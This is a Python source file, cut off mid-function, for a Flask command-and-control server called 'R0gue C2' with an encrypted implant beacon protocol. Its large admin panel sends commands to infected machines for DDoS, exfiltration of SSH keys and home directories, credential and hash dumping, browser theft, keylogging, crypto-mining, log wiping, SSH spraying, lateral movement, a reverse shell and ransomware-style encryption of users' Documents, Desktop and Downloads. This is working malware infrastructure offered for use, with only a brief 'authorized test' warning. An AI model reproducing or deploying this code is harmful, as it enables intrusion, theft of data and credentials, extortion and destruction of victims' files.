#!/usr/bin/env python3
from flask import Flask, request, jsonify, render_template_string
import threading, base64, os, socket, time
import zipfile, json
from Cryptodome.Cipher import AES
from datetime import datetime
import subprocess
import requests
from collections import defaultdict
import hashlib

app = Flask(__name__)
app.secret_key = 'RogueC2_RedTeam_v2'

# === Configuration ===
SECRET_KEY = b'6767BabyROGUE!&%5'
EXFIL_DECRYPT_KEY = b'magicRogueSEE!333'
C2_PORT = 4444
EXFIL_PORT = 9091
PAYLOAD_PORT = 8000

# Storage - using defaultdict for better handling
connected_bots = set()
pending_commands = defaultdict(list)
command_results = defaultdict(list)
bot_info = {}
# Map IP to permanent bot ID
ip_to_bot_id = {}

def encrypt_response(msg):
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext)

def decrypt_command(data):
    data = base64.b64decode(data)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

def get_bot_id(client_ip, implant_id=None):
    """Get or create consistent bot ID for an implant"""
    # Use implant_id as primary identifier, not IP
    if implant_id:
        # Create bot ID based on implant hash
        bot_id = f"bot_{implant_id}"
        ip_to_bot_id[bot_id] = bot_id  # Store by bot_id, not IP
        return bot_id
    
    # Fallback: use IP with hash if no implant_id
    if client_ip in ip_to_bot_id:
        return ip_to_bot_id[client_ip]
    
    identifier = client_ip
    bot_hash = hashlib.md5(identifier.encode()).hexdigest()[:8]
    bot_id = f"bot_{client_ip.replace('.', '_')}_{bot_hash}"
    ip_to_bot_id[client_ip] = bot_id
    return bot_id

# ==================== FLASK ROUTES ====================

@app.route('/', methods=['GET', 'POST'])
def c2_controller():
    """Main C2 endpoint - handles encrypted communications"""
    if request.method == 'GET':
        return "Rogue C2 Server Active - Use POST for encrypted commands"
    
    # Handle POST from implants
    try:
        client_ip = request.remote_addr
        encrypted_data = request.get_data()
        
        if not encrypted_data:
            return "No data", 400
        
        # Decrypt the command
        decrypted_cmd = decrypt_command(encrypted_data)
        
        # Handle beacon/command
        if decrypted_cmd == "beacon":
            # For beacon without implant_id, use IP-based ID (fallback)
            beacon_id = get_bot_id(client_ip)
            
            # Add to connected bots
            connected_bots.add(beacon_id)
            
            # Update bot info
            if beacon_id not in bot_info:
                bot_info[beacon_id] = {
                    'ip': client_ip,
                    'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'beacon_count': 0,
                    'commands_sent': 0,
                    'results_received': 0,
                    'implant_id': 'unknown'  # Will be updated when identified
                }
            
            # Update stats
            bot_info[beacon_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            bot_info[beacon_id]['beacon_count'] += 1
            
            # Return pending commands or "pong"
            commands = pending_commands.get(beacon_id, [])
            
            if commands:
                command_to_execute = commands.pop(0)
                response = command_to_execute
                print(f"[→] Sending command to {beacon_id}: {command_to_execute}")
                bot_info[beacon_id]['commands_sent'] += 1
            else:
                response = "pong"
                print(f"[✓] Beacon #{bot_info[beacon_id]['beacon_count']} from {beacon_id}")
            
            return encrypt_response(response)
        
        elif decrypted_cmd.startswith("result:"):
            # Store result from implant
            result = decrypted_cmd.replace("result:", "", 1)
            
            # Extract bot_id from result if possible, otherwise use IP
            beacon_id = None
            
            # Try to find which bot this result belongs to
            for bot_id in connected_bots:
                if bot_id in result or client_ip in bot_info.get(bot_id, {}).get('ip', ''):
                    beacon_id = bot_id
                    break
            
            if not beacon_id:
                # Create new bot entry if not found
                beacon_id = get_bot_id(client_ip)
                if beacon_id not in bot_info:
                    bot_info[beacon_id] = {
                        'ip': client_ip,
                        'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'beacon_count': 1,
                        'commands_sent': 0,
                        'results_received': 0,
                        'implant_id': 'unknown'
                    }
            
            result_entry = {
                'result': result,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'client_ip': client_ip,
                'bot_id': beacon_id
            }
            
            command_results[beacon_id].append(result_entry)
            bot_info[beacon_id]['results_received'] += 1
            bot_info[beacon_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            # Keep only last 10 results
            if len(command_results[beacon_id]) > 10:
                command_results[beacon_id] = command_results[beacon_id][-10:]
            
            print(f"[✓] Result from {beacon_id}: {result[:100]}...")
            
            return encrypt_response("result_received")
        
        elif decrypted_cmd.startswith("identify:"):
            # Implant sending identification - THIS IS KEY
            implant_id = decrypted_cmd.replace("identify:", "", 1).strip()
            
            # Use the implant's actual ID, not IP
            beacon_id = get_bot_id(client_ip, implant_id)
            
            # Update connected bots
            connected_bots.add(beacon_id)
            
            # Update bot info with implant_id
            if beacon_id not in bot_info:
                bot_info[beacon_id] = {
                    'ip': client_ip,
                    'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'beacon_count': 0,
                    'commands_sent': 0,
                    'results_received': 0,
                    'implant_id': implant_id
                }
            else:
                bot_info[beacon_id]['implant_id'] = implant_id
            
            bot_info[beacon_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            print(f"[+] Implant identified: {implant_id} -> Bot ID: {beacon_id}")
            
            return encrypt_response(f"identified:{beacon_id}")
        
        else:
            # Unknown command
            return encrypt_response(f"Unknown command: {decrypted_cmd}")
            
    except Exception as e:
        print(f"[!] C2 controller error: {e}")
        return encrypt_response(f"[!] Error: {str(e)}")

@app.route('/admin', methods=['GET'])
def admin_panel():
    """Web-based admin panel"""
    admin_html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>R0gue C2 Admin Panel</title>
        <style>
            body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; margin: 0; padding: 20px; }
            .container { max-width: 1400px; margin: 0 auto; }
            .header { background: #111; padding: 20px; border-bottom: 2px solid #00ff00; }
            .section { background: #151515; padding: 20px; margin: 20px 0; border: 1px solid #333; }
            .bot { background: #1a1a1a; padding: 15px; margin: 10px 0; border-left: 4px solid #ff0000; }
            .command-form { margin: 15px 0; }
            input, textarea, select, button { 
                background: #222; color: #0f0; border: 1px solid #444; 
                padding: 8px; margin: 5px; font-family: 'Courier New', monospace;
            }
            button { cursor: pointer; background: #333; }
            button:hover { background: #444; }
            .results { background: #111; padding: 10px; margin: 10px 0; font-size: 12px; }
            .status { color: #00ff00; }
            .error { color: #ff0000; }
            .active-bot { border-left: 4px solid #00ff00 !important; }
            .bot-stats { font-size: 12px; color: #888; margin-top: 5px; }
            .button-group { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0; }
            .button-group button { flex: 1; min-width: 120px; }
            .payload-btn { background: #2a2a5a; }
            .recon-btn { background: #5a2a2a; }
            .attack-btn { background: #5a2a5a; }
            .stealth-btn { background: #2a5a2a; }
            .util-btn { background: #2a5a5a; }
            .compound-btn { background: #5a5a2a; }
            .encryption-btn { background: #ff6600; }
            .tab-container { display: flex; border-bottom: 1px solid #444; margin-bottom: 20px; }
            .tab { padding: 10px 20px; cursor: pointer; border: 1px solid transparent; }
            .tab.active { background: #222; border: 1px solid #444; border-bottom: none; }
            .tab-content { display: none; }
            .tab-content.active { display: block; }
            .command-history { max-height: 300px; overflow-y: auto; }
            .fileransom-form { display: flex; flex-wrap: wrap; gap: 10px; align-items: flex-end; margin: 15px 0; }
            .fileransom-form > div { display: flex; flex-direction: column; }
            .fileransom-form label { font-size: 12px; margin-bottom: 3px; color: #888; }
            .warning-box { background: #3a1a1a; border: 2px solid #ff3333; padding: 15px; margin: 15px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1> R0gue C2  | by ek0ms savi0r </h1>
                <p>Server Time: {{ time }} | Active Bots: {{ bot_count }} | Commands Pending: {{ pending_count }}</p>
            </div>
            
            <div class="tab-container">
                <div class="tab active" onclick="switchTab('bots')"> Active Bots ({{ bot_count }})</div>
                <div class="tab" onclick="switchTab('operations')"> Operations</div>
                <div class="tab" onclick="switchTab('payloads')"> Payloads</div>
                <div class="tab" onclick="switchTab('results')"> Results</div>
                <div class="tab" onclick="switchTab('server')"> Server Status</div>
            </div>
            
            <!-- BOTS TAB -->
            <div id="bots-tab" class="tab-content active">
                <div class="section">
                    <h2> Active Bots ({{ bot_count }})</h2>
                    {% for bot in bot_list %}
                    <div class="bot {{ 'active-bot' if bot.last_seen_diff < 60 else '' }}">
                        <strong> {{ bot.id }}</strong>
                        <span class="status">● Implant ID: {{ bot.implant_id }}</span>
                        <span class="status">● Last seen: {{ bot.last_seen }} ({{ bot.last_seen_diff }}s ago)</span>
                        <span class="status">● IP: {{ bot.ip }}</span>
                        <div class="bot-stats">
                             Beacons: {{ bot.beacon_count }} |  Cmds Sent: {{ bot.commands_sent }} |  Results: {{ bot.results_received }}
                        </div>
                        
                        <div class="command-form">
                            <input type="text" id="cmd_{{ bot.id }}" placeholder="Command (whoami, ls, etc.)" style="width: 300px;">
                            <select id="type_{{ bot.id }}">
                                <option value="shell">Shell Command</option>
                                <option value="trigger_ddos">DDoS Attack</option>
                                <option value="trigger_exfil">Exfiltrate Data</option>
                                <option value="trigger_dumpcreds">Dump Credentials</option>
                                <option value="trigger_mine">Start Miner</option>
                                <option value="trigger_stealthinject">PolyRoot Persistence</option>
                                <option value="reverse_shell">Reverse Shell</option>
                                <option value="trigger_sysrecon">System Recon</option>
                                <option value="trigger_linpeas">PrivEsc Check</option>
                                <option value="trigger_hashdump">Dump Hashes</option>
                                <option value="trigger_browsersteal">Browser Data</option>
                                <option value="trigger_keylogger">Keylogger</option>
                                <option value="trigger_screenshot">Screenshots</option>
                                <option value="trigger_logclean">Clean Logs</option>
                                <!-- FILE ENCRYPTION OPTIONS -->
                                <option value="trigger_fileransom encrypt /home/user/Documents">Encrypt Documents</option>
                                <option value="trigger_fileransom encrypt /home/user/Downloads">Encrypt Downloads</option>
                                <option value="trigger_fileransom encrypt /home/user/Desktop">Encrypt Desktop</option>
                                <option value="trigger_fileransom encrypt /home/user/Pictures">Encrypt Pictures</option>
                                <option value="trigger_fileransom encrypt /tmp">Encrypt /tmp (Test)</option>
                                <option value="trigger_fileransom decrypt /home/user/Documents">Decrypt Documents</option>
                                <!-- END FILE ENCRYPTION -->
                                <option value="trigger_status">Implant Status</option>
                                <option value="trigger_help">Show Help</option>
                            </select>
                            <button onclick="sendCommand('{{ bot.id }}')">Send Command</button>
                            <button onclick="clearPending('{{ bot.id }}')" style="background: #660000;">Clear Pending</button>
                            <button onclick="sendToBot('{{ bot.id }}', 'trigger_status')" style="background: #2a5a5a;">Status</button>
                        </div>
                        
                        {% if pending_commands.get(bot.id) %}
                        <div class="results" style="border-left: 3px solid orange;">
                            <h4> Pending Commands:</h4>
                            {% for cmd in pending_commands[bot.id] %}
                            <div><small>→</small> {{ cmd }}</div>
                            {% endfor %}
                        </div>
                        {% endif %}
                        
                        {% if results.get(bot.id) %}
                        <div class="results command-history">
                            <h4> Recent Results:</h4>
                            {% for result in results[bot.id][-5:] %}
                            <div><small>{{ result.timestamp }}:</small> {{ result.result[:200] }}...</div>
                            {% endfor %}
                        </div>
                        {% endif %}
                    </div>
                    {% endfor %}
                    
                    <!-- FILE ENCRYPTION TOOL -->
                    <div class="section warning-box">
                        <h3 style="color: #ff6600;">⚠️ File Encryption Tool (DESTRUCTIVE)</h3>
                        <p><small>WARNING: This tool encrypts files and removes originals. Only use in authorized test environments!</small></p>
                        
                        <div class="fileransom-form">
                            <div>
                                <label>Action:</label>
                                <select id="fileransom_action">
                                    <option value="encrypt">Encrypt Files</option>
                                    <option value="decrypt">Decrypt Files</option>
                                </select>
                            </div>
                            <div>
                                <label>Target Path:</label>
                                <input type="text" id="fileransom_path" placeholder="/home/user/Documents" style="width: 300px;">
                            </div>
                            <div>
                                <label>Password (optional for encrypt):</label>
                                <input type="text" id="fileransom_password" placeholder="Leave empty for auto-generate">
                            </div>
                            <div style="align-self: flex-end;">
                                <button onclick="sendFileransomCommand()" style="background: #ff6600; font-weight: bold;">Execute File Encryption</button>
                            </div>
                        </div>
                        <div style="margin-top: 10px;">
                            <button onclick="quickFileransom('encrypt', '/home/user/Documents')" style="background: #ff3300;">Quick: Encrypt Documents</button>
                            <button onclick="quickFileransom('encrypt', '/home/user/Downloads')" style="background: #ff3300;">Quick: Encrypt Downloads</button>
                            <button onclick="quickFileransom('encrypt', '/home/user/Desktop')" style="background: #ff3300;">Quick: Encrypt Desktop</button>
                            <button onclick="quickFileransom('decrypt', '/home/user/Documents')" style="background: #3366ff;">Quick: Decrypt Documents</button>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- OPERATIONS TAB -->
            <div id="operations-tab" class="tab-content">
                <div class="section">
                    <h2> Quick Commands</h2>
                    <div class="button-group">
                        <button onclick="sendToAll('whoami')">Whoami (All)</button>
                        <button onclick="sendToAll('uname -a')">System Info</button>
                        <button onclick="sendToAll('ip a')">Network Info</button>
                        <button onclick="sendToAll('ls -la /home')">List Homes</button>
                        <button onclick="sendToAll('ps aux')">Process List</button>
                        <button onclick="sendToAll('df -h')">Disk Usage</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> Reconnaissance & Intelligence</h2>
                    <div class="button-group">
                        <button class="recon-btn" onclick="sendToAll('trigger_sysrecon')">System Recon</button>
                        <button class="recon-btn" onclick="sendToAll('trigger_linpeas')">PrivEsc Check</button>
                        <button class="recon-btn" onclick="sendToAll('trigger_hashdump')">Dump Hashes</button>
                        <button class="recon-btn" onclick="sendToAll('trigger_browsersteal')">Browser Data</button>
                        <button class="recon-btn" onclick="sendToAll('trigger_dumpcreds')">Dump Creds</button>
                        <button class="recon-btn" onclick="sendToAll('trigger_network_scan')">Network Scan</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> Advanced Operations</h2>
                    <div class="button-group">
                        <button class="compound-btn" onclick="sendToAll('trigger_full_recon')">Full Recon Suite</button>
                        <button class="compound-btn" onclick="sendToAll('trigger_harvest_all')">Harvest All Data</button>
                        <button class="compound-btn" onclick="sendToAll('trigger_clean_sweep')">Clean Sweep</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> File Operations</h2>
                    <div class="button-group">
                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt /home/user/Documents')">Encrypt Documents</button>
                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt /home/user/Downloads')">Encrypt Downloads</button>
                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt /home/user/Desktop')">Encrypt Desktop</button>
                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt /tmp')" style="background: #ff3300;">Test Encrypt /tmp</button>
                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom decrypt /home/user/Documents')" style="background: #3366ff;">Decrypt Documents</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> Persistence & Stealth</h2>
                    <div class="button-group">
                        <button class="stealth-btn" onclick="sendToAll('trigger_stealthinject')">PolyRoot Persistence</button>
                        <button class="stealth-btn" onclick="sendToAll('trigger_persistence_setup')">Additional Persistence</button>
                        <button class="stealth-btn" onclick="sendToAll('trigger_defense_evasion')">Defense Evasion</button>
                        <button class="stealth-btn" onclick="sendToAll('trigger_logclean')">Clean Logs</button>
                        <button class="stealth-btn" onclick="sendToAll('trigger_logclean all')">Clean All Logs</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> Monitoring & Collection</h2>
                    <div class="button-group">
                        <button class="payload-btn" onclick="sendToAll('trigger_keylogger')">Start Keylogger</button>
                        <button class="payload-btn" onclick="sendToAll('trigger_keylogger stop')">Stop Keylogger</button>
                        <button class="payload-btn" onclick="sendToAll('trigger_screenshot')">Start Screenshots</button>
                        <button class="payload-btn" onclick="sendToAll('trigger_screenshot stop')">Stop Screenshots</button>
                        <button class="payload-btn" onclick="sendToAll('reverse_shell')">Reverse Shell</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> Lateral Movement & Propagation</h2>
                    <div class="button-group">
                        <button class="attack-btn" onclick="sendToAll('trigger_lateral_move')">Lateral Movement</button>
                        <button class="attack-btn" onclick="sendToAll('trigger_autodeploy')">Auto-Deploy</button>
                        <button class="attack-btn" onclick="sendToAll('trigger_sshspray')">SSH Spray</button>
                        <button class="attack-btn" onclick="sendToAll('trigger_dnstunnel')">DNS Tunnel</button>
                        <button class="attack-btn" onclick="sendToAll('trigger_dnstunnel stop')">Stop DNS Tunnel</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> DDoS & Cryptomining</h2>
                    <div class="button-group">
                        <button class="attack-btn" onclick="sendToAll('trigger_ddos 192.168.1.1 80 60')">DDoS Test (60s)</button>
                        <button class="attack-btn" onclick="sendToAll('trigger_mine')">Start Miner</button>
                        <button class="attack-btn" onclick="sendToAll('trigger_stopmine')">Stop Miner</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> Implant Management</h2>
                    <div class="button-group">
                        <button class="util-btn" onclick="sendToAll('trigger_status')">Check Status</button>
                        <button class="util-btn" onclick="sendToAll('trigger_self_update')">Self Update</button>
                        <button class="util-btn" onclick="sendToAll('trigger_help')">Show Help</button>
                        <button class="util-btn" onclick="sendToAll('trigger_forensics_check')">Forensics Check</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> Data Exfiltration</h2>
                    <div class="button-group">
                        <button class="payload-btn" onclick="sendToAll('trigger_exfil /etc')">Exfil /etc</button>
                        <button class="payload-btn" onclick="sendToAll('trigger_exfil /home')">Exfil /home</button>
                        <button class="payload-btn" onclick="sendToAll('trigger_exfil /var/log')">Exfil Logs</button>
                        <button class="payload-btn" onclick="sendToAll('trigger_exfil ~/.ssh')">Exfil SSH Keys</button>
                    </div>
                </div>
            </div>
            
            <!-- PAYLOADS TAB -->
            <div id="payloads-tab" class="tab-content">
                <div class="section">
                    <h2> Payload Management</h2>
                    <div class="button-group">
                        <button onclick="location.href='/payloads/'">Browse Payloads</button>
                        <button onclick="refreshPayloads()">Refresh Payloads</button>
                    </div>
                    
                    <h3> Available Payloads</h3>
                    <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 10px;">
                        <div class="bot">
                            <strong>System Reconnaissance</strong>
                            <p><small>Comprehensive system/network intelligence gathering</small></p>
                            <button onclick="sendToAll('load_payload sysrecon.py')">Load</button>
                            <button onclick="sendToAll('run_payload sysrecon.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>LinPEAS Light</strong>
                            <p><small>Linux privilege escalation checker</small></p>
                            <button onclick="sendToAll('load_payload linpeas_light.py')">Load</button>
                            <button onclick="sendToAll('run_payload linpeas_light.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>Hash Dumper</strong>
                            <p><small>Extract password hashes from system</small></p>
                            <button onclick="sendToAll('load_payload hashdump.py')">Load</button>
                            <button onclick="sendToAll('run_payload hashdump.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>Browser Stealer</strong>
                            <p><small>Extract browser credentials and data</small></p>
                            <button onclick="sendToAll('load_payload browserstealer.py')">Load</button>
                            <button onclick="sendToAll('run_payload browserstealer.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>Keylogger</strong>
                            <p><small>Keystroke logging module</small></p>
                            <button onclick="sendToAll('load_payload keylogger.py')">Load</button>
                            <button onclick="sendToAll('run_payload keylogger.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>Screenshot Capture</strong>
                            <p><small>Periodic screen capture</small></p>
                            <button onclick="sendToAll('load_payload screenshot.py')">Load</button>
                            <button onclick="sendToAll('run_payload screenshot.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>Log Cleaner</strong>
                            <p><small>Remove forensic traces from logs</small></p>
                            <button onclick="sendToAll('load_payload logcleaner.py')">Load</button>
                            <button onclick="sendToAll('run_payload logcleaner.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>SSH Spray</strong>
                            <p><small>SSH credential spraying attack</small></p>
                            <button onclick="sendToAll('load_payload sshspray.py')">Load</button>
                            <button onclick="sendToAll('run_payload sshspray.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>DNS Tunnel</strong>
                            <p><small>DNS-based covert C2 channel</small></p>
                            <button onclick="sendToAll('load_payload dnstunnel.py')">Load</button>
                            <button onclick="sendToAll('run_payload dnstunnel.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>Auto Deploy</strong>
                            <p><small>Automated network deployment</small></p>
                            <button onclick="sendToAll('load_payload autodeploy.py')">Load</button>
                            <button onclick="sendToAll('run_payload autodeploy.py')Run</button>
                        </div>
                        <div class="bot" style="border: 2px solid #ff6600;">
                            <strong style="color: #ff6600;">File Encryption</strong>
                            <p><small>⚠️ AES-256 file encryption/decryption</small></p>
                            <button onclick="sendToAll('load_payload fileransom.py')">Load</button>
                            <button onclick="sendToAll('run_payload fileransom.py')" style="background: #ff6600;">Run</button>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- RESULTS TAB -->
            <div id="results-tab" class="tab-content">
                <div class="section">
                    <h2> Command Results History</h2>
                    {% for bot_id, bot_results in results.items() %}
                    <div class="bot">
                        <h3> {{ bot_id }}</h3>
                        <div class="results command-history">
                            {% for result in bot_results[-10:] %}
                            <div>
                                <strong>{{ result.timestamp }}</strong><br>
                                <small>IP: {{ result.client_ip }}</small><br>
                                <pre style="background: #111; padding: 5px; margin: 5px 0; overflow-x: auto;">{{ result.result[:500] }}{% if result.result|length > 500 %}...{% endif %}</pre>
                            </div>
                            {% endfor %}
                        </div>
                    </div>
                    {% endfor %}
                </div>
            </div>
            
            <!-- SERVER TAB -->
            <div id="server-tab" class="tab-content">
                <div class="section">
                    <h2> Server Status</h2>
                    <p><strong>Ngrok URL:</strong> {{ ngrok_url }}</p>
                    <p><strong>C2 Port:</strong> {{ c2_port }}</p>
                    <p><strong>Exfil Port:</strong> {{ exfil_port }}</p>
                    <p><strong>Reverse Shell Port:</strong> 9001</p>
                    <p><strong>Payloads Repository:</strong> <a href="{{ payload_url }}" target="_blank">{{ payload_url }}</a></p>
                    <p><strong>Active Bots:</strong> {{ bot_count }}</p>
                    <p><strong>Pending Commands:</strong> {{ pending_count }}</p>
                    <p><strong>Uptime:</strong> <span id="uptime">Calculating...</span></p>
                    
                    <h3> Quick Actions</h3>
                    <div class="button-group">
                        <button onclick="location.reload()">Refresh Page</button>
                        <button onclick="fetch('/ngrok_status').then(r => r.json()).then(data => alert('Ngrok Status: ' + data.status))">Check Ngrok</button>
                        <button onclick="fetch('/beacons').then(r => r.json()).then(data => alert('Active Beacons: ' + data.total))">Check Beacons</button>
                        <button onclick="clearAllPending()">Clear All Pending</button>
                    </div>
                </div>
            </div>
            
            <div class="section">
                <h2> Manual Command</h2>
                <input type="text" id="manual_bot" placeholder="Bot ID (or 'all' for all bots)">
                <input type="text" id="manual_cmd" placeholder="Command" style="width: 400px;">
                <button onclick="sendManualCommand()">Send</button>
                <button onclick="document.getElementById('manual_cmd').value = 'trigger_help'">Insert Help</button>
                <button onclick="document.getElementById('manual_cmd').value = 'trigger_status'">Insert Status</button>
                <button onclick="document.getElementById('manual_cmd').value = 'trigger_fileransom encrypt /home/user/Documents'" style="background: #ff6600;">Insert File Encrypt</button>
            </div>
        </div>
        
        <script>
            let serverStartTime = Date.now();
            
            function updateUptime() {
                const uptimeMs = Date.now() - serverStartTime;
                const days = Math.floor(uptimeMs / (1000 * 60 * 60 * 24));
                const hours = Math.floor((uptimeMs % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                const minutes = Math.floor((uptimeMs % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((uptimeMs % (1000 * 60)) / 1000);
                
                let uptimeStr = '';
                if (days > 0) uptimeStr += days + 'd ';
                if (hours > 0) uptimeStr += hours + 'h ';
                if (minutes > 0) uptimeStr += minutes + 'm ';
                uptimeStr += seconds + 's';
                
                document.getElementById('uptime').textContent = uptimeStr;
            }
            
            setInterval(updateUptime, 1000);
            updateUptime();
            
            function switchTab(tabName) {
                // Hide all tabs
                document.querySelectorAll('.tab-content').forEach(tab => {
                    tab.classList.remove('active');
                });
                document.querySelectorAll('.tab').forEach(tab => {
                    tab.classList.remove('active');
                });
                
                // Show selected tab
                document.getElementById(tabName + '-tab').classList.add('active');
                document.querySelector(`[onclick="switchTab('${tabName}')"]`).classList.add('active');
            }
            
            function sendCommand(botId) {
                const cmdInput = document.getElementById('cmd_' + botId);
                const typeSelect = document.getElementById('type_' + botId);
                const command = typeSelect.value === 'shell' ? cmdInput.value : typeSelect.value + (cmdInput.value ? ' ' + cmdInput.value : '');
                
                if (!command.trim()) {
                    alert('Please enter a command');
                    return;
                }
                
                // Special warning for file encryption
                if (command.includes('trigger_fileransom encrypt')) {
                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
                        return;
                    }
                }
                
                fetch('/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        beacon_id: botId,
                        command: command
                    })
                }).then(r => r.json()).then(data => {
                    alert('Command sent to ' + botId + ' (ID: ' + data.command_id + ')');
                    cmdInput.value = '';
                    setTimeout(() => location.reload(), 1000);
                }).catch(err => {
                    alert('Error sending command: ' + err);
                });
            }
            
            function sendToBot(botId, command) {
                // Special warning for file encryption
                if (command.includes('trigger_fileransom encrypt')) {
                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
                        return;
                    }
                }
                
                fetch('/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        beacon_id: botId,
                        command: command
                    })
                }).then(r => r.json()).then(data => {
                    alert('Command sent to ' + botId);
                    setTimeout(() => location.reload(), 1000);
                });
            }
            
            function clearPending(botId) {
                fetch('/clear_pending/' + botId, {
                    method: 'POST'
                }).then(r => r.json()).then(data => {
                    alert('Cleared pending commands for ' + botId);
                    location.reload();
                });
            }
            
            function clearAllPending() {
                {% for bot in bot_list %}
                fetch('/clear_pending/{{ bot.id }}', {
                    method: 'POST'
                });
                {% endfor %}
                alert('Cleared pending commands for all bots');
                setTimeout(() => location.reload(), 1000);
            }
            
            function sendToAll(command) {
                // Special warning for file encryption
                if (command.includes('trigger_fileransom encrypt')) {
                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nThis command will be sent to ALL bots.\\n\\nContinue?')) {
                        return;
                    }
                }
                
                if (!confirm('Send "' + command + '" to ALL bots?')) return;
                
                {% for bot in bot_list %}
                fetch('/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        beacon_id: '{{ bot.id }}',
                        command: command
                    })
                });
                {% endfor %}
                alert('Command sent to all bots: ' + command);
                setTimeout(() => location.reload(), 2000);
            }
            
            function sendManualCommand() {
                const botId = document.getElementById('manual_bot').value;
                const command = document.getElementById('manual_cmd').value;
                
                if (!botId || !command) {
                    alert('Please enter both Bot ID and Command');
                    return;
                }
                
                // Special warning for file encryption
                if (command.includes('trigger_fileransom encrypt')) {
                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
                        return;
                    }
                }
                
                if (botId.toLowerCase() === 'all') {
                    sendToAll(command);
                    return;
                }
                
                fetch('/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        beacon_id: botId,
                        command: command
                    })
                }).then(r => r.json()).then(data => {
                    alert('Command sent: ' + data.command_id);
                    document.getElementById('manual_cmd').value = '';
                    setTimeout(() => location.reload(), 1000);
                });
            }
            
            function refreshPayloads() {
                fetch('/payloads/').then(r => r.text()).then(html => {
                    alert('Payloads refreshed');
                    location.reload();
                });
            }
            
            // FILE ENCRYPTION FUNCTIONS
            function sendFileransomCommand() {
                var action = document.getElementById('fileransom_action').value;
                var path = document.getElementById('fileransom_path').value;
                var password = document.getElementById('fileransom_password').value;
                
                if (!path) {
                    if (action === 'encrypt') {
                        path = '/home/user/Documents';
                    } else {
                        alert('Please enter a target path for decryption');
                        return;
                    }
                }
                
                // Special warning for encryption
                if (action === 'encrypt') {
                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nPath: ' + path + '\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
                        return;
                    }
                }
                
                var cmd = 'trigger_fileransom ' + action + ' ' + path;
                if (password) {
                    cmd += ' ' + password;
                }
                
                // Find the currently selected bot
                var selectedBot = document.querySelector('.bot.active-bot');
                if (!selectedBot) {
                    alert('Please select a bot first');
                    return;
                }
                
                var botId = selectedBot.querySelector('strong').textContent.trim();
                sendToBot(botId, cmd);
            }
            
            function quickFileransom(action, path) {
                // Special warning for encryption
                if (action === 'encrypt') {
                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nPath: ' + path + '\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
                        return;
                    }
                }
                
                var cmd = 'trigger_fileransom ' + action + ' ' + path;
                
                // Find the currently selected bot
                var selectedBot = document.querySelector('.bot.active-bot');
                if (!selectedBot) {
                    alert('Please select a bot first');
                    return;
                }
                
                var botId = selectedBot.querySelector('strong').textContent.trim();
                sendToBot(botId, cmd);
            }
            
            // Auto-refresh every 30 seconds
            setTimeout(() => location.reload(), 30000);
        </script>
    </body>
    </html>
    '''
    
    # Prepare bot list with time since last seen
    current_time = datetime.now()
    bot_list = []
    
    # Clean up old bots (not seen for 5 minutes)
    bots_to_remove = []
    for bot_id in list(connected_bots):
        if bot_id in bot_info:
